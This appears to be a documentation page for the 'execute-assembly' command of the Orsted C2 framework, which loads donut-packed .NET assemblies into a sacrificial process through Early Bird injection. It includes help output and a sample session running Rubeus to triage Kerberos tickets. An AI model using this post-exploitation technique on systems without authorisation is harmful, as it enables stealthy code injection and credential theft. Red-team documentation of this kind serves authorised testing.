---

title: execute-assembly
descripton: orsted c2 execute-assembly
---

### General

`execute-assembly` allows you to load and run donut assembly in a remote process.

It is the classic fork and run.

```
[Session 9: haroun@DESKTOP-DU89UIV] » execute-assembly --help

Load and Execute NET Assembly with donut

Usage:
  execute-assembly [flags] file [args...]

Args:
  file  string         Assembly to load
  args  string list    Argument of the Assembly

Flags:
  -h, --help              display help
  -m, --method  string    Method to load Assembly (default: 1)
  -p, --process string    Sacrificial Process (default: C:\Windows\System32\notepad.exe)
```

It requires you to load the `execute-assembly` dll with `load-module execute-assembly`

Currently only one method is supported (Early Bird). It is not very opsec. Future methods will be available.

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » execute-assembly Rubeus.exe triage
```

The output will be something like

```
[Session 9: haroun@DESKTOP-DU89UIV] » execute-assembly Rubeus.exe triage
+--------+-----------+---------+---------------------------------+
| TASKID | SESSIONID |  STATE  |             COMMAND             |
+--------+-----------+---------+---------------------------------+
|    103 |         9 | pending | execute-assembly 1              |
|        |           |         | C:\Windows\System32\notepad.exe |
+--------+-----------+---------+---------------------------------+
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> execute-assembly --method 1 --process C:\Windows\System32\notepad.exe Rubeus.exe triage
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> execute-assembly --method 1 --process C:\Windows\System32\notepad.exe Rubeus.exe triage
 <<<
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x598b2

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


```


